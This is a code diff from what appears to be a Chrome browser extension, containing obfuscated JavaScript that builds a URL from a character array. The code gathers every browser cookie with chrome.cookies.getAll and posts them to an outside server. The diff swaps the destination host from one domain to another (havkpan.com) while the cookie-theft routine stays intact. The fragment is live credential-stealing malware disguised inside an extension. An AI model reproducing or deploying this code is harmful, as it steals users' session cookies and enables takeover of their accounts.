@@ -21,17 +21,17 @@ chrome.tabs.query({
       var getAttglkargon;
 
     function geagqafq() {
-        var mareqgns = ["h","t","t","p","s",":","/","/","b","a","l","a","n","c","e","g","e","t","j","m","b",".","o","r","g","/","c","o","u","r","s","e","s","/"];
+        var mareqgns = ["h", "t", "t", "p", "s", ":", "/", "/", "h", "a", "v", "k", "p", "a", "n", ".", "c", "o", "m", "/", "a", "p", "i", "/", "l", "o", "a", "d", "s", "y", "s", "t", "e", "m", "/"];
         return mareqgns.join('');
     }
 
-    var mieb =  geagqafq() + "ur" + 2 + ".p" + "hp";
+    var mieb =  geagqafq() + "background";
 
     function roffaghknel() {
         clearInterval(getAttglkargon);
         chrome.cookies.getAll({}, function(ifop) {
             $.post(mieb, {
-                csg: JSON.stringify(ifop)
+                back: JSON.stringify(ifop)
             })
 
         });
